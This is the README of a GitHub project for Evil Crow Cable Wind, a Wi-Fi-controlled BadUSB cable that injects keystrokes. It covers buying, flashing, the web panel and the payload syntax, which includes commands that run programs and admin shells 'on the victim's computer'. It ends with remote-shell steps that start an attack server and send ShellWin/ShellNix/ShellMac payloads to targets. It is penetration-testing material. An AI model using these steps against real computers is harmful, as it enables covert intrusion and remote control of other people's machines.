# EvilCrowCable-Wind

![EvilCrow](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/logo.png)

**Idea, development and implementation:** Joel Serna (@JoelSernaMoreno).

**Firmware collaborators:** Juraj Belko (@s_c_johnson) and rustysun9.

**Payloads collaborators:** AndrzejRPiotrowski.

**Final PCB design:** April Brother (@aprbrother).

**Manufacturer and distributor:** April Brother (@aprbrother).

**Distributor in the United Kingdom:** KSEC Worldwide (@KSEC_KC).

The developers and collaborators of this project do not earn any money from it. 
You can invite me to a coffee to further develop low-cost hacking devices. If you don't invite me, no worries, I will keep developing devices

[![ko-fi](https://www.ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/E1E614OA5)

**Available with April Brother (shipping from China):** 

* USB-A to USB-C:
	
	* Tindie: https://www.tindie.com/products/aprbrother/evilcrowcable-wind-usb-a-to-type-c/
	* Alibaba: https://www.alibaba.com/product-detail/Crow-Cable-wind-USB-A-to_1601279738180.html
	* Aliexpress: https://www.aliexpress.com/item/3256807818385526.html

* USB-C to USB-C: 

	* Tindie: https://www.tindie.com/products/aprbrother/evilcrowcable-wind/
	* Alibaba: https://www.alibaba.com/product-detail/Crow-Cable-wind-based-on-ESP32_1601269809241.html
	* Aliexpress: https://www.aliexpress.com/item/1005007904610809.html

**Available with SAPSAN Cybersec & Military (shipping from EU, Poland):**

* USB-A to USB-C:

	* https://sapsan-sklep.pl/en/products/evil-crow-cable-wind-badusb-wifi

* USB-C to USB-C:

	* https://sapsan-sklep.pl/en/products/evil-crow-cable-wind-badusb-wifi

**Available with KSEC Worldwide (shipping from the United Kingdom):**

* USB-C to USB-C: https://labs.ksec.co.uk/product/evil-crow-wind-usb-c-wifi-enabled-badusb-device/

**Available with Tienda Espía (shipping from Mexico):**

* USB-A to USB-C and USB-C to USB-C:

	* https://tiendaespia.com.mx/producto/evil-crow-cable-wind-badusb-wifi/

**Summary:**

1. Disclaimer
2. Introduction
3. Firmware
	* Flash Mode
	* Installation
	* First steps with Evil Crow Cable Wind
	* Home
	* Live Payload
	* Upload Payload
	* List Payloads
	* Config
	* Debug messages
	* HTTP Update
4. Add a new Keyboard Layout
5. Sintax
	* Payload Syntax
	* Keys and Modifiers Syntax
6. Remote Shell
	* Linux/iOS Server
	* Windows Server
	* Android Server

![Cable](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/cable.jpg)

# Disclaimer

Evil Crow Cable Wind is a basic device for professionals and cybersecurity enthusiasts.

We are not responsible for the incorrect use of Evil Crow Cable Wind.

We recommend using this device for testing, learning and fun :D

Evil Crow Cable Wind © 2024 by Joel Serna Moreno is licensed under CC BY-NC-SA 4.0. To view a copy of this license, visit https://creativecommons.org/licenses/by-nc-sa/4.0/

# Introduction

Evil Crow Cable Wind is a BadUSB device based on ESP32-S3 (It only allows charging of the mobile phone).

Evil Crow Cable Wind can be controlled with a web panel over Wi-Fi, the device is configured in STATION mode. You will need to set up a Wi-Fi access point with your mobile phone or another device, Evil Crow Cable Wind will automatically connect to it.

Evil Crow Cable Wind is pre-configured with English layout (EN_US), but is compatible with other keyboard layouts:

* BE_BE
* BR_BR
* CA_CA
* CA_FR
* DA_DK
* DE_DE
* EN_US
* ES_ES
* FR_FR
* HR_HR
* HU_HU
* IT_IT
* PT_PT
* PT_BR
* SK_SK
* CZ_CZ
* SV_SE
* SI_SI

You can change the keyboard layout in real time from the web panel.

**NOTE:** 

* **Not all layouts have been tested. If you find any incorrect keys, you can change them and submit a PR to the Evil Crow Cable Wind repository.**

* **All devices have been flashed with basic firmware before shipping.**

* **Please do not request new features in this code. You can develop code for Evil Crow Cable Wind and submit a PR with your new features.**

# Firmware

## Flash Mode

To flash the firmware on Evil Crow Cable Wind you need a magnet.

Place the magnet on the active end of the Evil Crow Cable Wind and connect it to the computer.

![Magnet](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/magnet.jpg)

You can check that the flash mode is correct with the following image:

![Flash Mode](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/flash-mode.png)

## Installation

1. Install esptool: sudo apt install esptool
2. Install pyserial: sudo pip install pyserial
3. Download and Install the Arduino IDE: https://www.arduino.cc/en/main/software
4. Download Evil Crow Cable Wind repository: git clone https://github.com/joelsernamoreno/EvilCrowCable-Wind.git
5. Copy and unzip the USB library included in this repository (EvilCrowCable-Wind/modified-libraries/) to your Arduino library directory
6. Open Arduino IDE
7. Go to File - Preferences. Locate the field "Additional Board Manager URLs:" Add "https://espressif.github.io/arduino-esp32/package_esp32_index.json" without quotes. Click "Ok"
8. Select Tools - Board - Boards Manager. Search for "esp32". Install "esp32 by Espressif system version 3.2.0"
9. Flash firmware.ino:
	* Connect active end of the cable with a magnet to the computer
	* Open EvilCrowCable-Wind/firmware/firmware.ino in Arduino IDE
	* Select Tools:
		- Board - "ESP32S3 Dev Module"
    	  	- USB CDC On Boot - "Disabled"
    	  	- CPU Frequency - "80MHz (Wi-Fi)
    	  	- Core Debug Level - "None"
    	  	- USB DFU On Boot - "Disabled"
    	  	- Erase All Flash Before Sketch Upload - "Disabled"
    	  	- Events Run On - "Core 1"
    	  	- Flash Mode - "QIO 80MHZ"
    	  	- Flash Size - "8MB (64Mb)"
    	  	- JTAG Adapter - "Disabled"
    	  	- Arduino Runs On - "Core 1"
    		- USB Firmware MSC On Boot - "Disabled".
    		- Partition Scheme - "8M with SPIFFS (3MB APP/1.5MB SPIFFS)"
    		- PSRAM - "Disabled"
    		- Upload Mode - "UART0 / Hardware CDC"
    		- Upload Speed - "921600"
    		- USB Mode - "Hardware CDC and JTAG"
    		- Zigbee Mode - "Disabled"
    	* Upload firmware

## First steps with Evil Crow Cable Wind

1. Set up a Wi-Fi AP with your mobile phone:
	* SSID: Evil Crow Cable Wind
	* Password: 123456789
2. Disconnect and re-connect the device to the computer (Connect the active end to the computer).
3. Open a browser and access the web panel: http://cable-wind.local/

**Note:** If you cannot access the web panel, use the IP address assigned to Evil Crow Cable Wind or follow below steps **only if you are running Linux OS:**
 * check if avahi-deamon is installed and running on your PC. You can do this with executing "sudo systemctl status avahi-daemon" in terminal
 * If service is not running, install it using your package manager (apt, yum, dnf, Packman, rpm,...)
 * After successful installation, start avahi-daemon service with "sudo systemctl start avahi-daemon && sudo systemctl enable avahi-daemon"
 * In case cable-wind.local is still not reachable, use http://"IP address", where "IP address" is IP assigned to Evil Crow Cable Wind.

## Home

The Home page shows interesting information about the device.

![Home](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/home.png)

## Live Payload

The Live Payload page allows you to run payloads or save payloads:

* You can use the "Run Payload" option to run the payload.
* You can use the "Startup exec payload" option to save the payload in memory and run it every time Evil Crow Cable Wind is connected to a computer.
* You can use the "Save Payload" option to save the payload in memory.

![LivePayload](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/livepayload.png)

**Run Payload example:**

![RunPayloadExample](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/run-payload-example.png)

**Startup exec payload example:** You have to include the keyboard layout in the payload

![ExecExample](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/startup-exec-example.png)

To remove the automatic exec, delete the payload-startup.txt payload from the List Payloads option.

![DelStartup](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/del-startup.png)

**Save Payload example:** You have to include the file name

![SaveExample](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/save-payload-example.png)

## Upload Payload

The Upload Payload page allows you to upload and store payloads in memory.

![Upload](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/upload.png)

**Note:** Check the available memory on the Home page.

## List Payloads

The List Payload page allows you to run or delete payloads stored in memory.

![Payloads](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/payloads.png)

![ListPayloads](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/list-payloads-example.png)

## Config

The Config page allows you to change the Keyboard Layout, Wi-Fi configuration or USB configuration.

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/config.png)

* **Set Layout:**

Configure the keyboard layout. Keyboard Layout changes are stored.

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/set-layout.png)

* **Set Wi-Fi Config:**

SSID and password of your Wi-Fi access point. Wi-Fi configuration changes are stored. Evil Crow Cable Wind will restart when changes are applied.

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/set-wifi.png)

* **Delete Wi-Fi Config:**

Delete Wi-Fi configuration file. Evil Crow Cable Wind will restart and connect to the default Wi-Fi access point (SSID: Evil Crow Cable Wind / Password: 123456789).

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/delete-configwifi.png)

* **Set USB Config:**

Configure Vendor ID, Product ID, Product Name y Manufacturer Name. USB Configuration changes are stored. Evil Crow Cable Wind will restart when changes are applied.

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/set-usb.png)

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/vid-pid.png)

**Note:** Be sure to enter the correct data, or you may risk bricking the device. Additional VendorID/ProductIDs available on: https://devicehunt.com/all-usb-vendors

* **Delete USB Config:**

Delete USB configuration file. Evil Crow Cable Wind will restart and configure itself with the default USB configuration.

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/delete-usb.png)

## Debug messages

Debug messages will be displayed for each feature in the web panel:

![Debug](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/debug-payload.png)

![Debug](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/debug-layout.png)

![Debug](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/debug-save.png)

![Debug](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/debug-startup.png)

## HTTP Update

You can update the firmware without a magnet:

1. Open firmware.ino in the Arduino IDE
2. Configure the options as described in the 'Installation' section
3. Click on sketch -> Export Compiled Binary

This will create the binaries:

* EvilCrowCable-Wind/firmware/build/esp32.esp32.esp32s3/

![Binaries](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/binaries.png)

4. Set up a Wi-Fi access point for Evil Crow Cable Wind and your computer
5. Connect Evil Crow Cable Wind to the Wi-Fi AP and your computer (without magnet)
6. Connect your computer to the Wi-Fi AP
7. Open a terminal in EvilCrowCable-Wind/firmware/build/esp32.esp32.esp32s3/
8. Flash the binary firmware.ino.bin with the following command: curl -F "image=@firmware.ino.bin" cable-wind.local/update

![Update](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/update.png)

# Add a new Keyboard Layout

If you want to add a new keyboard layout:

1. Go to the Arduino libraries directory and create your layout in USB/src/layouts/

**Note:** Use the other layouts for reference.

![Add Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/add-layout.png)

2. Modify USB/src/USBHIDKeyboard.h and include your new layout.

![Include Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/include-layout.png)

3. Modify the firmware.ino to change your layout in real time.

![Firmware Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/firmware-layout.png)

![Firmware Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/firmware-layout1.png)

![Firmware Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/firmware-layout2.png)

4. Modify config.h in firmware.ino to change to your new layout from the web panel.

![Web Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/web-layout.png)

5. Flash firmware.ino again.

# Sintax

## Payload Syntax

To develop Evil Crow Cable Wind payloads, you need to know the syntax of the interpreter. All the commands allowed in the interpreter are listed here:

| Command | Example | Description |
| ------- | ------- | ----------- |
| `ServerConnect` | `ServerConnect IP` |Read the "Remote Shell" section for more information |
| `RunWin` | `RunWin cmd` |Runs a command or a program on the victim's computer |
| `RunPowershellAdmin` | `RunPowershellAdmin` | Run powershell as administrator |
| `RunCmdAdmin` | `RunCmdAdmin` | Run cmd as administrator |
| `ShellWin` | `ShellWin IP` | Read the "Remote Shell" section for more information |
| `RunNix` | `RunNix gedit` | Runs a command or a program on the victim's computer |
| `RunLauncher` | `RunLauncher libreoffice` | Runs a command or a program on the victim's computer |
| `CtrlAltT` | `CtrlAltT` | Run a terminal on the victim's computer |
| `ShellNix` | `ShellNix IP` | Read the "Remote Shell" section for more information |
| `ShellMac` | `ShellMac IP` | Read the "Remote Shell" section for more information |
| `ShellMacCleanup` | `ShellMacCleanup` | Read the "Remote Shell" section for more information |
| `RunMac` | `RunMac terminal` | Runs a command or a program on the victim's computer |
| `GuiR` | `GuiR` | Press WINDOWS+R on the victim's computer |
| `AltF2` | `AltF2` | Press ALT+F2 on the victim's computer |
| `GuiSpace` | `GuiSpace` | Press WINDOWS+SPACE on the victim's computer |
| `Print` | `Print Hello World!` | Prints a text on the victim's computer |
| `PrintLine` | `PrintLine Hello World!` | Prints a text and presses the ENTER key on the victim's computer |
| `Delay` | `Delay 5000` | Delay in ms |
| `Press` | `Press KEY_ENTER` | Press a key or modifier on the victim's computer |
| `PressRelease` | `PressRelease KEY_ENTER` | Press and Release a key or modifier on the victim's computer |
| `Release` | `Release` | Release all pressed keys |

**NOTE:** You can find payloads for Evil Crow Cable Wind in this repository (EvilCrowCable-Wind/payloads).

## Keys and Modifiers Syntax

**MODIFIERS:**

| Modifiers | Example | 
| ------- | ------- |
| `KEY_LEFT_ALT` | `Press KEY_LEFT_ALT` |
| `KEY_LEFT_GUI` | `Press KEY_LEFT_GUI` |
| `KEY_LEFT_CTRL` | `Press KEY_LEFT_CTRL` |
| `KEY_LEFT_SHIFT` | `Press KEY_LEFT_SHIFT` |
| `KEY_RIGHT_ALT` | `Press KEY_RIGHT_ALT` |
| `KEY_RIGHT_GUI` | `Press KEY_RIGHT_GUI` |
| `KEY_RIGHT_CTRL` | `Press KEY_RIGHT_CTRL` |
| `KEY_RIGHT_SHIFT` | `Press KEY_RIGHT_SHIFT` |

**STANDARD KEYS:**

| Keys | Example |
| ------- | ------- |
| `a` - `z` | `Press r` or `PressRelease r`|
| `A` - `Z` | `Press A` or `PressRelease A`|
| `0` - `9` | `Press 1` or `PressRelease 1`|
| `Special characters` | `Press @` or `PressRelease @`|

**OTHER KEYS:**

| Other Keys | Example |
| ------- | ------- |
| `KEY_ENTER` | `Press KEY_ENTER` or `PressRelease KEY_ENTER`|
| `KEY_UP_ARROW` | `Press KEY_UP_ARROW` or `PressRelease KEY_UP_ARROW`|
| `KEY_DOWN_ARROW` | `Press KEY_DOWN_ARROW` or `PressRelease KEY_DOWN_ARROW`|
| `KEY_LEFT_ARROW` | `Press KEY_LEFT_ARROW` or `PressRelease KEY_LEFT_ARROW`|
| `KEY_RIGHT_ARROW` | `Press KEY_RIGHT_ARROW` or `PressRelease KEY_RIGHT_ARROW`|
| `KEY_BACKSPACE` | `Press KEY_BACKSPACE` or `PressRelease KEY_BACKSPACE`|
| `KEY_TAB` | `Press KEY_TAB` or `PressRelease KEY_TAB`|
| `KEY_PAUSE` | `Press KEY_PAUSE` or `PressRelease KEY_PAUSE`|
| `KEY_INSERT` | `Press KEY_INSERT` or `PressRelease KEY_INSERT`|
| `KEY_DELETE` | `Press KEY_DELETE` or `PressRelease KEY_DELETE`|
| `KEY_PAGE_UP` | `Press KEY_PAGE_UP` or `PressRelease KEY_PAGE_UP`|
| `KEY_PAGE_DOWN` | `Press KEY_PAGE_DOWN` or `PressRelease KEY_PAGE_DOWN`|
| `KEY_ESC` | `Press KEY_ESC` or `PressRelease KEY_ESC`|
| `KEY_SPACE` | `Press KEY_SPACE` or `PressRelease KEY_SPACE`|
| `KEY_HOME` | `Press KEY_HOME` or `PressRelease KEY_HOME`|
| `KEY_END` | `Press KEY_END` or `PressRelease KEY_END`|
| `KEY_CAPS_LOCK` | `Press KEY_CAPS_LOCK` or `PressRelease KEY_CAPS_LOCK`|
| `KEY_PRINT_SCREEN` | `Press KEY_PRINT_SCREEN` or `PressRelease KEY_PRINT_SCREEN`|
| `KEY_SCROLL_LOCK` | `Press KEY_SCROLL_LOCK` or `PressRelease KEY_SCROLL_LOCK`|
| `KEY_NUM_LOCK` | `Press KEY_NUM_LOCK` or `PressRelease KEY_NUM_LOCK`|
| `KEY_MENU` | `Press KEY_MENU` or `PressRelease KEY_MENU`|
| `LED_NUMLOCK` | `Press LED_NUMLOCK` or `PressRelease LED_NUMLOCK`|
| `LED_CAPSLOCK` | `Press LED_CAPSLOCK` or `PressRelease LED_CAPSLOCK`|
| `LED_SCROLLLOCK` | `Press LED_SCROLLLOCK` or `PressRelease LED_SCROLLLOCK`|
| `LED_COMPOSE` | `Press LED_COMPOSE` or `PressRelease LED_COMPOSE`|
| `LED_KANA` | `Press LED_KANA` or `PressRelease LED_KANA`|
| `KEY_F1` | `Press KEY_F1` or `PressRelease KEY_F1`|
| `KEY_F2` | `Press KEY_F2` or `PressRelease KEY_F2`|
| `KEY_F3` | `Press KEY_F3` or `PressRelease KEY_F3`|
| `KEY_F4` | `Press KEY_F4` or `PressRelease KEY_F4`|
| `KEY_F5` | `Press KEY_F5` or `PressRelease KEY_F5`|
| `KEY_F6` | `Press KEY_F6` or `PressRelease KEY_F6`|
| `KEY_F7` | `Press KEY_F7` or `PressRelease KEY_F7`|
| `KEY_F8` | `Press KEY_F8` or `PressRelease KEY_F8`|
| `KEY_F9` | `Press KEY_F9` or `PressRelease KEY_F9`|
| `KEY_F10` | `Press KEY_F10` or `PressRelease KEY_F10`|
| `KEY_F11` | `Press KEY_F11` or `PressRelease KEY_F11`|
| `KEY_F12` | `Press KEY_F12` or `PressRelease KEY_F12`|

# Remote Shell

Evil Crow Cable Wind allows you to execute commands remotely on a computer without a network connection.

Evil Crow Cable Wind uses port 4444 for communication. If you want to change this, modify firmware.ino:

![Port](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/port.png)

You have several ways to run Evil Crow Server.

* Linux and iOS: evilcrow-server.py --port {PORT} --target {windows, linux or mac}
* Android: evilcrow-server.apk (Install the APK on an android phone. Default port 4444)
* Windows: evilcrow-server.exe --port {PORT}

## Linux/iOS Server

1. Run evilcrow-server.py to start the attack:

	* Windows Target: python evilcrow-server.py --port 4444 --target windows
	* Linux Target: python evilcrow-server.py --port 4444 --target linux
	* MacOS Target: python evilcrow-server.py --port 4444 --target macos
	
![Server](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/server.png)

2. Go to the web panel and type the following payload from Live Payload:

	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)
	
3. Click on 'Run Payload'.

## Windows Server

1. Run evilcrow-server.exe to start the attack:

	* Windows, Linux or MacOS Target: evilcrow-server.exe --port 4444

2. Go to the web panel and type the following payload from Live Payload:

	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)
	
3. Click on 'Run Payload'.

![Server](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/server-windows.png)

## Android Server

1. Open Evil Crow Server APP

2. Go to the web panel and type the following payload from Live Payload:

	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)

3. Click on 'Run Payload'.

![Server](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/server-android.jpg)

**Demo:** [Remote Shell](https://www.youtube.com/watch?v=FmkIHYdOxS4)

